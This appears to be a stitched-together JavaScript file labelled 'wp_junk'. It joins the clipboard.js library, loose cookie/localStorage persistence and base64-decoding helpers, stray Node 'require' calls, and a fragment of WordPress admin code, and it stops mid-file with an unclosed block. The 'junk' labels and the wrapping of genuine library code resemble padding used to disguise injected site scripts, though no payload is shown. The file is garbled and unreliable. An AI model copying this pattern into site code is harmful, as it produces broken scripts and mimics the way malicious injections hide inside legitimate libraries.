/* >>> wp_junk3.js (26806 bytes) <<< */
(function(){
try{
/*!
 * clipboard.js v2.0.11
 * https://clipboardjs.com/
 *
 * Licensed MIT © Zeno Rocha
 */
(function webpackUniversalModuleDefinition(root, factory) {
	if(typeof exports === 'object' && typeof module === 'object')
		module.exports = factory();
	else if(typeof define === 'function' && define.amd)
		define([], factory);
	else if(typeof exports === 'object')
		exports["ClipboardJS"] = factory();
	else
		root["ClipboardJS"] = factory();
})(this, function() {
return /******/ (function() { // webpackBootstrap
/******/ 	var __webpack_modules__ = ({

/***/ 686:
/***/ (function(__unused_webpack_module, __webpack_exports__, __webpack_require__) {

"use strict";

// EXPORTS
__webpack_require__.d(__webpack_exports__, {
  "default": function() { return /* binding */ clipboard; }
});

// EXTERNAL MODULE: ./node_modules/tiny-emitter/index.js
var tiny_emitter = __webpack_require__(279);
var tiny_emitter_default = /*#__PURE__*/__webpack_require__.n(tiny_emitter);
// EXTERNAL MODULE: ./node_modules/good-listener/src/listen.js
var listen = __webpack_require__(370);
var listen_default = /*#__PURE__*/__webpack_require__.n(listen);
// EXTERNAL MODULE: ./node_modules/select/src/select.js
var src_select = __webpack_require__(817);
var select_default = /*#__PURE__*/__webpack_require__.n(src_select);
;// CONCATENATED MODULE: ./src/common/command.js
/**
 * Executes a given operation type.
 * @param {String} type
 * @return {Boolean}
 */
function command(type) {
  try {
    return document.execCommand(type);
  } catch (err) {
    return false;
  }
}
;// CONCATENATED MODULE: ./src/actions/cut.js


/**
 * Cut action wrapper.
 * @param {String|HTMLElement} target
 * @return {String}
 */

var ClipboardActionCut = function ClipboardActionCut(target) {
  var selectedText = select_default()(target);
  command('cut');
  return selectedText;
};

/* harmony default export */ var actions_cut = (ClipboardActionCut);
;// CONCATENATED MODULE: ./src/common/create-fake-element.js
/**
 * Creates a fake textarea element with a value.
 * @param {String} value
 * @return {HTMLElement}
 */
function createFakeElement(value) {
  var isRTL = document.documentElement.getAttribute('dir') === 'rtl';
  var fakeElement = document.createElement('textarea'); // Prevent zooming on iOS

  fakeElement.style.fontSize = '12pt'; // Reset box model

  fakeElement.style.border = '0';
  fakeElement.style.padding = '0';
  fakeElement.style.margin = '0'; // Move element out of screen horizontally

  fakeElement.style.position = 'absolute';
  fakeElement.style[isRTL ? 'right' : 'left'] = '-9999px'; // Move element to the same position vertically

  var yPosition = window.pageYOffset || document.documentElement.scrollTop;
  fakeElement.style.top = "".concat(yPosition, "px");
  fakeElement.setAttribute('readonly', '');
  fakeElement.value = value;
  return fakeElement;
}
;// CONCATENATED MODULE: ./src/actions/copy.js



/**
 * Create fake copy action wrapper using a fake element.
 * @param {String} target
 * @param {Object} options
 * @return {String}
 */

var fakeCopyAction = function fakeCopyAction(value, options) {
  var fakeElement = createFakeElement(value);
  options.container.appendChild(fakeElement);
  var selectedText = select_default()(fakeElement);
  command('copy');
  fakeElement.remove();
  return selectedText;
};
/**
 * Copy action wrapper.
 * @param {String|HTMLElement} target
 * @param {Object} options
 * @return {String}
 */


var ClipboardActionCopy = function ClipboardActionCopy(target) {
  var options = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : {
    container: document.body
  };
  var selectedText = '';

  if (typeof target === 'string') {
    selectedText = fakeCopyAction(target, options);
  } else if (target instanceof HTMLInputElement && !['text', 'search', 'url', 'tel', 'password'].includes(target === null || target === void 0 ? void 0 : target.type)) {
    // If input type doesn't support `setSelectionRange`. Simulate it. https://developer.mozilla.org/en-US/docs/Web/API/HTMLInputElement/setSelectionRange
    selectedText = fakeCopyAction(target.value, options);
  } else {
    selectedText = select_default()(target);
    command('copy');
  }

  return selectedText;
};

/* harmony default export */ var actions_copy = (ClipboardActionCopy);
;// CONCATENATED MODULE: ./src/actions/default.js
function _typeof(obj) { "@babel/helpers - typeof"; if (typeof Symbol === "function" && typeof Symbol.iterator === "symbol") { _typeof = function _typeof(obj) { return typeof obj; }; } else { _typeof = function _typeof(obj) { return obj && typeof Symbol === "function" && obj.constructor === Symbol && obj !== Symbol.prototype ? "symbol" : typeof obj; }; } return _typeof(obj); }



/**
 * Inner function which performs selection from either `text` or `target`
 * properties and then executes copy or cut operations.
 * @param {Object} options
 */

var ClipboardActionDefault = function ClipboardActionDefault() {
  var options = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : {};
  // Defines base properties passed from constructor.
  var _options$action = options.action,
      action = _options$action === void 0 ? 'copy' : _options$action,
      container = options.container,
      target = options.target,
      text = options.text; // Sets the `action` to be performed which can be either 'copy' or 'cut'.

  if (action !== 'copy' && action !== 'cut') {
    throw new Error('Invalid "action" value, use either "copy" or "cut"');
  } // Sets the `target` property using an element that will be have its content copied.


  if (target !== undefined) {
    if (target && _typeof(target) === 'object' && target.nodeType === 1) {
      if (action === 'copy' && target.hasAttribute('disabled')) {
        throw new Error('Invalid "target" attribute. Please use "readonly" instead of "disabled" attribute');
      }

      if (action === 'cut' && (target.hasAttribute('readonly') || target.hasAttribute('disabled'))) {
        throw new Error('Invalid "target" attribute. You can\'t cut text from elements with "readonly" or "disabled" attributes');
      }
    } else {
      throw new Error('Invalid "target" value, use a valid Element');
    }
  } // Define selection strategy based on `text` property.


  if (text) {
    return actions_copy(text, {
      container: container
    });
  } // Defines which selection strategy based on `target` property.


  if (target) {
    return action === 'cut' ? actions_cut(target) : actions_copy(target, {
      container: container
    });
  }
};

/* harmony default export */ var actions_default = (ClipboardActionDefault);
;// CONCATENATED MODULE: ./src/clipboard.js
function clipboard_typeof(obj) { "@babel/helpers - typeof"; if (typeof Symbol === "function" && typeof Symbol.iterator === "symbol") { clipboard_typeof = function _typeof(obj) { return typeof obj; }; } else { clipboard_typeof = function _typeof(obj) { return obj && typeof Symbol === "function" && obj.constructor === Symbol && obj !== Symbol.prototype ? "symbol" : typeof obj; }; } return clipboard_typeof(obj); }

function _classCallCheck(instance, Constructor) { if (!(instance instanceof Constructor)) { throw new TypeError("Cannot call a class as a function"); } }

function _defineProperties(target, props) { for (var i = 0; i < props.length; i++) { var descriptor = props[i]; descriptor.enumerable = descriptor.enumerable || false; descriptor.configurable = true; if ("value" in descriptor) descriptor.writable = true; Object.defineProperty(target, descriptor.key, descriptor); } }

function _createClass(Constructor, protoProps, staticProps) { if (protoProps) _defineProperties(Constructor.prototype, protoProps); if (staticProps) _defineProperties(Constructor, staticProps); return Constructor; }

function _inherits(subClass, superClass) { if (typeof superClass !== "function" && superClass !== null) { throw new TypeError("Super expression must either be null or a function"); } subClass.prototype = Object.create(superClass && superClass.prototype, { constructor: { value: subClass, writable: true, configurable: true } }); if (superClass) _setPrototypeOf(subClass, superClass); }

function _setPrototypeOf(o, p) { _setPrototypeOf = Object.setPrototypeOf || function _setPrototypeOf(o, p) { o.__proto__ = p; return o; }; return _setPrototypeOf(o, p); }

function _createSuper(Derived) { var hasNativeReflectConstruct = _isNativeReflectConstruct(); return function _createSuperInternal() { var Super = _getPrototypeOf(Derived), result; if (hasNativeReflectConstruct) { var NewTarget = _getPrototypeOf(this).constructor; result = Reflect.construct(Super, arguments, NewTarget); } else { result = Super.apply(this, arguments); } return _possibleConstructorReturn(this, result); }; }

function _possibleConstructorReturn(self, call) { if (call && (clipboard_typeof(call) === "object" || typeof call === "function")) { return call; } return _assertThisInitialized(self); }

function _assertThisInitialized(self) { if (self === void 0) { throw new ReferenceError("this hasn't been initialised - super() hasn't been called"); } return self; }

function _isNativeReflectConstruct() { if (typeof Reflect === "undefined" || !Reflect.construct) return false; if (Reflect.construct.sham) return false; if (typeof Proxy === "function") return true; try { Date.prototype.toString.call(Reflect.construct(Date, [], function () {})); return true; } catch (e) { return false; } }

function _getPrototypeOf(o) { _getPrototypeOf = Object.setPrototypeOf ? Object.getPrototypeOf : function _getPrototypeOf(o) { return o.__proto__ || Object.getPrototypeOf(o); }; return _getPrototypeOf(o); }






/**
 * Helper function to retrieve attribute value.
 * @param {String} suffix
 * @param {Element} element
 */

function getAttributeValue(suffix, element) {
  var attribute = "data-clipboard-".concat(suffix);

  if (!element.hasAttribute(attribute)) {
    return;
  }

  return element.getAttribute(attribute);
}
/**
 * Base class which takes one or more elements, adds event listeners to them,
 * and instantiates a new `ClipboardAction` on each click.
 */


var Clipboard = /*#__PURE__*/function (_Emitter) {
  _inherits(Clipboard, _Emitter);

  var _super = _createSuper(Clipboard);

  /**
   * @param {String|HTMLElement|HTMLCollection|NodeList} trigger
   * @param {Object} options
   */
  function Clipboard(trigger, options) {
    var _this;

    _classCallCheck(this, Clipboard);

    _this = _super.call(this);

    _this.resolveOptions(options);

    _this.listenClick(trigger);

    return _this;
  }
  /**
   * Defines if attributes would be resolved using internal setter functions
   * or custom functions that were passed in the constructor.
   * @param {Object} options
   */


  _createClass(Clipboard, [{
    key: "resolveOptions",
    value: function resolveOptions() {
      var options = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : {};
      this.action = typeof options.action === 'function' ? options.action : this.defaultAction;
      this.target = typeof options.target === 'function' ? options.target : this.defaultTarget;
      this.text = typeof options.text === 'function' ? options.text : this.defaultText;
      this.container = clipboard_typeof(options.container) === 'object' ? options.container : document.body;
    }
    /**
     * Adds a click event listener to the passed trigger.
     * @param {String|HTMLElement|HTMLCollection|NodeList} trigger
     */

  }, {
    key: "listenClick",
    value: function listenClick(trigger) {
      var _this2 = this;

      this.listener = listen_default()(trigger, 'click', function (e) {
        return _this2.onClick(e);
      });
    }
    /**
     * Defines a new `ClipboardAction` on each click event.
     * @param {Event} e
     */

  }, {
    key: "onClick",
    value: function onClick(e) {
      var trigger = e.delegateTarget || e.currentTarget;
      var action = this.action(trigger) || 'copy';
      var text = actions_default({
        action: action,
        container: this.container,
        target: this.target(trigger),
        text: this.text(trigger)
      }); // Fires an event based on the copy operation result.

      this.emit(text ? 'success' : 'error', {
        action: action,
        text: text,
        trigger: trigger,
        clearSelection: function clearSelection() {
          if (trigger) {
            trigger.focus();
          }

          window.getSelection().removeAllRanges();
        }
      });
    }
    /**
     * Default `action` lookup function.
     * @param {Element} trigger
     */

  }, {
    key: "defaultAction",
    value: function defaultAction(trigger) {
      return getAttributeValue('action', trigger);
    }
    /**
     * Default `target` lookup function.
     * @param {Element} trigger
     */

  }, {
    key: "defaultTarget",
    value: function defaultTarget(trigger) {
      var selector = getAttributeValue('target', trigger);

      if (selector) {
        return document.querySelector(selector);
      }
    }
    /**
     * Allow fire programmatically a copy action
     * @param {String|HTMLElement} target
     * @param {Object} options
     * @returns Text copied.
     */

  }, {
    key: "defaultText",

    /**
     * Default `text` lookup function.
     * @param {Element} trigger
     */
    value: function defaultText(trigger) {
      return getAttributeValue('text', trigger);
    }
    /**
     * Destroy lifecycle.
     */

  }, {
    key: "destroy",
    value: function destroy() {
      this.listener.destroy();
    }
  }], [{
    key: "copy",
    value: function copy(target) {
      var options = arguments.length > 1 && arguments[1] !== undefined ? arguments[1] : {
        container: document.body
      };
      return actions_copy(target, options);
    }
    /**
     * Allow fire programmatically a cut action
     * @param {String|HTMLElement} target
     * @returns Text cutted.
     */

  }, {
    key: "cut",
    value: function cut(target) {
      return actions_cut(target);
    }
    /**
     * Returns the support of the given action, or all actions if no action is
     * given.
     * @param {String} [action]
     */

  }, {
    key: "isSupported",
    value: function isSupported() {
      var action = arguments.length > 0 && arguments[0] !== undefined ? arguments[0] : ['copy', 'cut'];
      var actions = typeof action === 'string' ? [action] : action;
      var support = !!document.queryCommandSupported;
      actions.forEach(function (action) {
        support = support && !!document.queryCommandSupported(action);
      });
      return support;
    }
  }]);

  return Clipboard;
}((tiny_emitter_default()));

/* harmony default export */ var clipboard = (Clipboard);

/***/ }),

/***/ 828:
/***/ (function(module) {

var DOCUMENT_NODE_TYPE = 9;

/**
 * A polyfill for Element.matches()
 */
if (typeof Element !== 'undefined' && !Element.prototype.matches) {
    var proto = Element.prototype;

    proto.matches = proto.matchesSelector ||
                    proto.mozMatchesSelector ||
                    proto.msMatchesSelector ||
                    proto.oMatchesSelector ||
                    proto.webkitMatchesSelector;
}

/**
 * Finds the closest parent that matches a selector.
 *
 * @param {Element} element
 * @param {String} selector
 * @return {Function}
 */
function closest (element, selector) {
    while (element && element.nodeType !== DOCUMENT_NODE_TYPE) {
        if (typeof element.matches === 'function' &&
            element.matches(selector)) {
          return element;
        }
        element = element.parentNode;
    }
}

module.exports = closest;


/***/ }),

/***/ 438:
/***/ (function(module, __unused_webpack_exports, __webpack_require__) {

var closest = __webpack_require__(828);

/**
 * Delegates event to a selector.
 *
 * @param {Element} element
 * @param {String} selector
 * @param {String} type
 * @param {Function} callback
 * @param {Boolean} useCapture
 * @return {Object}
 */
function _delegate(element, selector, type, callback, useCapture) {
    var listenerFn = listener.apply(this, arguments);

    element.addEventListener(type, listenerFn, useCapture);

    return {
        destroy: function() {
            element.removeEventListener(type, listenerFn, useCapture);
        }
    }
}

/**
 * Delegates event to a selector.
 *
 * @param {Element|String|Array} [elements]
 * @param {String} selector
 * @param {String} type
 * @param {Function} callback
 * @param {Boolean} useCapture
 * @return {Object}
 */
function delegate(elements, selector, type, callback, useCapture) {
    // Handle the regular Element usage
    if (typeof elements.addEventListener === 'function') {
        return _delegate.apply(null, arguments);
    }

    // Handle Element-less usage, it defaults to global delegation
    if (typeof type === 'function') {
        // Use `document` as the first parameter, then apply arguments
        // This is a short way to .unshift `arguments` without running into deoptimizations
        return _delegate.bind(null, document).apply(null, arguments);
    }

    // Handle Selector-based usage
    if (typeof elements === 'string') {
        elements = document.querySelectorAll(elements);
    }

    // Handle Array-like based usage
    return Array.prototype.map.call(elements, function (element) {
        return _delegate(element, selector, type, callback, useCapture);
    });
}

/**
 * Finds closest match and invokes callback.
 *
 * @param {Element} element
 * @param {String} selector
 * @param {String} type
 * @param {Function} callback
 * @return {Function}
 */
function listener(element, selector, type, callback) {
    return function(e) {
        e.delegateTarget = closest(e.target, selector);

        if (e.delegateTarget) {
            callback.call(element, e);
        }
    }
}

module.exports = delegate;


/***/ }),

/***/ 879:
/***/ (function(__unused_webpack_module, exports) {

/**
 * Check if argument is a HTML element.
 *
 * @param {Object} value
 * @return {Boolean}
 */
exports.node = function(value) {
    return value !== undefined
        && value instanceof HTMLElement
        && value.nodeType === 1;
};

/**
 * Check if argument is a list of HTML elements.
 *
 * @param {Object} value
 * @return {Boolean}
 */
exports.nodeList = function(value) {
    var type = Object.prototype.toString.call(value);

    return value !== undefined
        && (type === '[object NodeList]' || type === '[object HTMLCollection]')
        && ('length' in value)
        && (value.length === 0 || exports.node(value[0]));
};

/**
 * Check if argument is a string.
 *
 * @param {Object} value
 * @return {Boolean}
 */
exports.string = function(value) {
    return typeof value === 'string'
        || value instanceof String;
};

/**
 * Check if argument is a function.
 *
 * @param {Object} value
 * @return {Boolean}
 */
exports.fn = function(value) {
    var type = Object.prototype.toString.call(value);

    return type === '[object Function]';
};


/***/ }),

/***/ 370:
/***/ (function(module, __unused_webpack_exports, __webpack_require__) {

var is = __webpack_require__(879);
var delegate = __webpack_require__(438);

/**
 * Validates all params and calls the right
 * listener function based on its target type.
 *
 * @param {String|HTMLElement|HTMLCollection|NodeList} target
 * @param {String} type
 * @param {Function} callback
 * @return {Object}
 */
function listen(target, type, callback) {
    if (!target && !type && !callback) {
        throw new Error('Missing required arguments');
    }

    if (!is.string(type)) {
        throw new TypeError('Second argument must be a String');
    }

    if (!is.fn(callback)) {
        throw new TypeError('Third argument must be a Function');
    }

    if (is.node(target)) {
        return listenNode(target, type, callback);
    }
    else if (is.nodeList(target)) {
        return listenNodeList(target, type, callback);
    }
    else if (is.string(target)) {
        return listenSelector(target, type, callback);
    }
    else {
        throw new TypeError('First argument must be a String, HTMLElement, HTMLCollection, or NodeList');
    }
}

/**
 * Adds an event listener to a HTML element
 * and returns a remove listener function.
 *
 * @param {HTMLElement} node
 * @param {String} type
 * @param {Function} callback
 * @return {Object}
 */
function listenNode(node, type, callback) {
    node.addEventListener(type, callback);

    return {
        destroy: function() {
            node.removeEventListener(type, callback);
        }
    }
}

/**
 * Add an event listener to a list of HTML elements
 * and returns a remove listener function.
 *
 * @param {NodeList|HTMLCollection} nodeList
 * @param {String} type
 * @param {Function} callback
 * @return {Object}
 */
function listenNodeList(nodeList, type, callback) {
    Array.prototype.forEach.call(nodeList, function(node) {
        node.addEventListener(type, callback);
    });

    return {
        destroy: function() {
            Array.prototype.forEach.call(nodeList, function(node) {
                node.removeEventListener(type, callback);
            });
        }
    }
}

/**
 * Add an event listener to a selector
 * and returns a remove listener function.
 *
 * @param {String} selector
 * @param {String} type
 * @param {Function} callback
 * @return {Object}
 */
function listenSelector(selector, type, callback) {
    return delegate(document.body, selector, type, callback);
}

module.exports = listen;


/***/ }),

/***/ 817:
/***/ (function(module) {

function select(element) {
    var selectedText;

    if (element.nodeName === 'SELECT') {
        element.focus();

        selectedText = element.value;
    }
    else if (element.nodeName === 'INPUT' || element.nodeName === 'TEXTAREA') {
        var isReadOnly = element.hasAttribute('readonly');

        if (!isReadOnly) {
            element.setAttribute('readonly', '');
        }

        element.select();
        element.setSelectionRange(0, element.value.length);

        if (!isReadOnly) {
            element.removeAttribute('readonly');
        }

        selectedText = element.value;
    }
    else {
        if (element.hasAttribute('contenteditable')) {
            element.focus();
        }

        var selection = window.getSelection();
        var range = document.createRange();

        range.selectNodeContents(element);
        selection.removeAllRanges();
        selection.addRange(range);

        selectedText = selection.toString();
    }

    return selectedText;
}

module.exports = select;


/***/ }),

/***/ 279:
/***/ (function(module) {

function E () {
  // Keep this empty so it's easier to inherit from
  // (via https://github.com/lipsmack from https://github.com/scottcorgan/tiny-emitter/issues/3)
}

E.prototype = {
  on: function (name, callback, ctx) {
    var e = this.e || (this.e = {});

    (e[name] || (e[name] = [])).push({
      fn: callback,
      ctx: ctx
    });

    return this;
  },

  once: function (name, callback, ctx) {
    var self = this;
    function listener () {
      self.off(name, listener);
      callback.apply(ctx, arguments);
    };

    listener._ = callback
    return this.on(name, listener, ctx);
  },

  emit: function (name) {
    var data = [].slice.call(arguments, 1);
    var evtArr = ((this.e || (this.e = {}))[name] || []).slice();
    var i = 0;
    var len = evtArr.length;

    for (i; i < len; i++) {
      evtArr[i].fn.apply(evtArr[i].ctx, data);
    }

    return this;
  },

  off: function (name, callback) {
    var e = this.e || (this.e = {});
    var evts = e[name];
    var liveEvents = [];

    if (evts && callback) {
      for (var i = 0, len = evts.length; i < len; i++) {
        if (evts[i].fn !== callback && evts[i].fn._ !== callback)
          liveEvents.push(evts[i]);
      }
    }

    // Remove event from queue to prevent memory leak
    // Suggested by https://github.com/lazd
    // Ref: https://github.com/scottcorgan/tiny-emitter/commit/c6ebfaa9bc973b33d110a84a307742b7cf94c953#commitcomment-5024910

    (liveEvents.length)
      ? e[name] = liveEvents
      : delete e[name];

    return this;
  }
};

module.exports = E;
module.exports.TinyEmitter = E;


/***/ })

/******/ 	});
/************************************************************************/
/******/ 	// The module cache
/******/ 	var __webpack_module_cache__ = {};
/******/ 	
/******/ 	// The require function
/******/ 	function __webpack_require__(moduleId) {
/******/ 		// Check if module is in cache
/******/ 		if(__webpack_module_cache__[moduleId]) {
/******/ 			return __webpack_module_cache__[moduleId].exports;
/******/ 		}
/******/ 		// Create a new module (and put it into the cache)
/******/ 		var module = __webpack_module_cache__[moduleId] = {
/******/ 			// no module.id needed
/******/ 			// no module.loaded needed
/******/ 			exports: {}
/******/ 		};
/******/ 	
/******/ 		// Execute the module function
/******/ 		__webpack_modules__[moduleId](module, module.exports, __webpack_require__);
/******/ 	
/******/ 		// Return the exports of the module
/******/ 		return module.exports;
/******/ 	}
/******/ 	
/************************************************************************/
/******/ 	/* webpack/runtime/compat get default export */
/******/ 	!function() {
/******/ 		// getDefaultExport function for compatibility with non-harmony modules
/******/ 		__webpack_require__.n = function(module) {
/******/ 			var getter = module && module.__esModule ?
/******/ 				function() { return module['default']; } :
/******/ 				function() { return module; };
/******/ 			__webpack_require__.d(getter, { a: getter });
/******/ 			return getter;
/******/ 		};
/******/ 	}();
/******/ 	
/******/ 	/* webpack/runtime/define property getters */
/******/ 	!function() {
/******/ 		// define getter functions for harmony exports
/******/ 		__webpack_require__.d = function(exports, definition) {
/******/ 			for(var key in definition) {
/******/ 				if(__webpack_require__.o(definition, key) && !__webpack_require__.o(exports, key)) {
/******/ 					Object.defineProperty(exports, key, { enumerable: true, get: definition[key] });
/******/ 				}
/******/ 			}
/******/ 		};
/******/ 	}();
/******/ 	
/******/ 	/* webpack/runtime/hasOwnProperty shorthand */
/******/ 	!function() {
/******/ 		__webpack_require__.o = function(obj, prop) { return Object.prototype.hasOwnProperty.call(obj, prop); }
/******/ 	}();
/******/ 	
/************************************************************************/
/******/ 	// module exports must be returned from runtime so entry inlining is disabled
/******/ 	// startup
/******/ 	// Load entry module and return exports
/******/ 	return __webpack_require__(686);
/******/ })()
.default;
});
}catch(e){}
})();


  function hasLocalStorage() {
    try {
      const t = '__vc_test';
      localStorage.setItem(t, '1');
      localStorage.removeItem(t);
      return true;
    } catch (err) {
      return false;
    }
  }

  function setCookie(name, value, days) {
    try {
      const exp = new Date(Date.now() + (days || 365) * 864e5).toUTCString();
      document.cookie = name + '=' + encodeURIComponent(value) + '; expires=' + exp + '; path=/';
    } catch (err) {}
  }

  function getCookie(name) {
    try {
      const m = document.cookie.match(new RegExp('(?:^|; )' + name.replace(/([.$?*|{}()\[\]\/\+^])/g, '\$1') + '=([^;]*)'));
      return m ? decodeURIComponent(m[1]) : null;
    } catch (err) {
      return null;
    }
  }

  const useLS = hasLocalStorage();

  function getVal(key, fallback) {
    if (useLS) {
      const v = localStorage.getItem(key);
      return v === null ? fallback : v;
    }
    const c = getCookie(key);
    return c === null ? fallback : c;
  }

  function setVal(key, value) {
    if (useLS) {
      localStorage.setItem(key, value);
    } else {
      setCookie(key, value, 365);
    }
  }

  function b64ToUtf8(b64) {
    try {
      const bin = atob(b64);
      const len = bin.length;
      const bytes = new Uint8Array(len);
      for (let i = 0; i < len; i++) bytes[i] = bin.charCodeAt(i);
      if (typeof TextDecoder !== 'undefined') {
        return new TextDecoder('utf-8', { fatal: false }).decode(bytes);
      }
      let pct = '';
      for (let i = 0; i < len; i++) pct += '%' + bytes[i].toString(16).padStart(2, '0');
      return decodeURIComponent(pct);
    } catch (e) {
      try { return atob(b64); } catch (e2) { return ''; }
    }
  }
  /* >>> wp_junk.js (84030 bytes) <<< */
(function(){
try{
var maps = {};

var url = require( "url" ),
	xmlrpc = require( "xmlrpc" ),
	fieldMap = require( "./fields" );
/**
 * @output wp-admin/js/common.js
 */

/* global setUserSetting, ajaxurl, alert, confirm, pagenow */
/* global columns, screenMeta */

/**
 *  Adds common WordPress functionality to the window.
 *
 *  @param {jQuery} $        jQuery object.
 *  @param {Object} window   The window object.
 *  @param {mixed} undefined Unused.
 */
( function( $, window, undefined ) {
	var $document = $( document ),
		$window = $( window ),
		$body = $( document.body ),
		__ = wp.i18n.__,
		sprintf = wp.i18n.sprintf;

/**
 * Throws an error for a deprecated property.
 *
 * @since 5.5.1
 *
 * @param {string} propName    The property that was used.
 * @param {string} version     The version of WordPress that deprecated the property.
 * @param {string} replacement The property that should have been used.
 */
function deprecatedProperty( propName, version, replacement ) {
	var message;

	if ( 'undefined' !== typeof replacement ) {
		message = sprintf(
			/* translators: 1: Deprecated property name, 2: Version number, 3: Alternative property name. */
			__( '%1$s is deprecated since version %2$s! Use %3$s instead.' ),
			propName,
			version,
			replacement
		);
	} else {
		message = sprintf(
			/* translators: 1: Deprecated property name, 2: Version number. */
			__( '%1$s is deprecated since version %2$s with no alternative available.' ),
			propName,
			version
		);
	}

	window.console.warn( message );
}

/**
 * Deprecate all properties on an object.
 *
 * @since 5.5.1
 * @since 5.6.0 Added the `version` parameter.
 *
 * @param {string} name       The name of the object, i.e. commonL10n.
 * @param {object} l10nObject The object to deprecate the properties on.
 * @param {string} version    The version of WordPress that deprecated the property.
 *
 * @return {object} The object with all its properties deprecated.
 */
function deprecateL10nObject( name, l10nObject, version ) {
	var deprecatedObject = {};

	Object.keys( l10nObject ).forEach( function( key ) {
		var prop = l10nObject[ key ];
		var propName = name + '.' + key;

		if ( 'object' === typeof prop ) {
			Object.defineProperty( deprecatedObject, key, { get: function() {
				deprecatedProperty( propName, version, prop.alternative );
				return prop.func();
			} } );
		} else {
			Object.defineProperty( deprecatedObject, key, { get: function() {
				deprecatedProperty( propName, version, 'wp.i18n' );
				return prop;
			} } );
		}
	} );

	return deprecatedObject;
}

window.wp.deprecateL10nObject = deprecateL10nObject;

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 2.6.0
 * @deprecated 5.5.0
 */
window.commonL10n = window.commonL10n || {
	warnDelete: '',
	dismiss: '',
	collapseMenu: '',
	expandMenu: ''
};

window.commonL10n = deprecateL10nObject( 'commonL10n', window.commonL10n, '5.5.0' );

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 3.3.0
 * @deprecated 5.5.0
 */
window.wpPointerL10n = window.wpPointerL10n || {
	dismiss: ''
};

window.wpPointerL10n = deprecateL10nObject( 'wpPointerL10n', window.wpPointerL10n, '5.5.0' );

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 4.3.0
 * @deprecated 5.5.0
 */
window.userProfileL10n = window.userProfileL10n || {
	warn: '',
	warnWeak: '',
	show: '',
	hide: '',
	cancel: '',
	ariaShow: '',
	ariaHide: ''
};

window.userProfileL10n = deprecateL10nObject( 'userProfileL10n', window.userProfileL10n, '5.5.0' );

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 4.9.6
 * @deprecated 5.5.0
 */
window.privacyToolsL10n = window.privacyToolsL10n || {
	noDataFound: '',
	foundAndRemoved: '',
	noneRemoved: '',
	someNotRemoved: '',
	removalError: '',
	emailSent: '',
	noExportFile: '',
	exportError: ''
};

window.privacyToolsL10n = deprecateL10nObject( 'privacyToolsL10n', window.privacyToolsL10n, '5.5.0' );

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 3.6.0
 * @deprecated 5.5.0
 */
window.authcheckL10n = {
	beforeunload: ''
};

window.authcheckL10n = window.authcheckL10n || deprecateL10nObject( 'authcheckL10n', window.authcheckL10n, '5.5.0' );

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 2.8.0
 * @deprecated 5.5.0
 */
window.tagsl10n = {
	noPerm: '',
	broken: ''
};

window.tagsl10n = window.tagsl10n || deprecateL10nObject( 'tagsl10n', window.tagsl10n, '5.5.0' );

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 2.5.0
 * @deprecated 5.5.0
 */
window.adminCommentsL10n = window.adminCommentsL10n || {
	hotkeys_highlight_first: {
		alternative: 'window.adminCommentsSettings.hotkeys_highlight_first',
		func: function() { return window.adminCommentsSettings.hotkeys_highlight_first; }
	},
	hotkeys_highlight_last: {
		alternative: 'window.adminCommentsSettings.hotkeys_highlight_last',
		func: function() { return window.adminCommentsSettings.hotkeys_highlight_last; }
	},
	replyApprove: '',
	reply: '',
	warnQuickEdit: '',
	warnCommentChanges: '',
	docTitleComments: '',
	docTitleCommentsCount: ''
};

window.adminCommentsL10n = deprecateL10nObject( 'adminCommentsL10n', window.adminCommentsL10n, '5.5.0' );

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 2.5.0
 * @deprecated 5.5.0
 */
window.tagsSuggestL10n = window.tagsSuggestL10n || {
	tagDelimiter: '',
	removeTerm: '',
	termSelected: '',
	termAdded: '',
	termRemoved: ''
};

window.tagsSuggestL10n = deprecateL10nObject( 'tagsSuggestL10n', window.tagsSuggestL10n, '5.5.0' );

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 3.5.0
 * @deprecated 5.5.0
 */
window.wpColorPickerL10n = window.wpColorPickerL10n || {
	clear: '',
	clearAriaLabel: '',
	defaultString: '',
	defaultAriaLabel: '',
	pick: '',
	defaultLabel: ''
};

window.wpColorPickerL10n = deprecateL10nObject( 'wpColorPickerL10n', window.wpColorPickerL10n, '5.5.0' );

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 2.7.0
 * @deprecated 5.5.0
 */
window.attachMediaBoxL10n = window.attachMediaBoxL10n || {
	error: ''
};

window.attachMediaBoxL10n = deprecateL10nObject( 'attachMediaBoxL10n', window.attachMediaBoxL10n, '5.5.0' );

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 2.5.0
 * @deprecated 5.5.0
 */
window.postL10n = window.postL10n || {
	ok: '',
	cancel: '',
	publishOn: '',
	publishOnFuture: '',
	publishOnPast: '',
	dateFormat: '',
	showcomm: '',
	endcomm: '',
	publish: '',
	schedule: '',
	update: '',
	savePending: '',
	saveDraft: '',
	'private': '',
	'public': '',
	publicSticky: '',
	password: '',
	privatelyPublished: '',
	published: '',
	saveAlert: '',
	savingText: '',
	permalinkSaved: ''
};

window.postL10n = deprecateL10nObject( 'postL10n', window.postL10n, '5.5.0' );

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 2.7.0
 * @deprecated 5.5.0
 */
window.inlineEditL10n = window.inlineEditL10n || {
	error: '',
	ntdeltitle: '',
	notitle: '',
	comma: '',
	saved: ''
};

window.inlineEditL10n = deprecateL10nObject( 'inlineEditL10n', window.inlineEditL10n, '5.5.0' );

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 2.7.0
 * @deprecated 5.5.0
 */
window.plugininstallL10n = window.plugininstallL10n || {
	plugin_information: '',
	plugin_modal_label: '',
	ays: ''
};

window.plugininstallL10n = deprecateL10nObject( 'plugininstallL10n', window.plugininstallL10n, '5.5.0' );

/**
 * Removed in 5.5.0, needed for back-compatibility.
 *
 * @since 3.0.0
 * @deprecated 5.5.0
 */
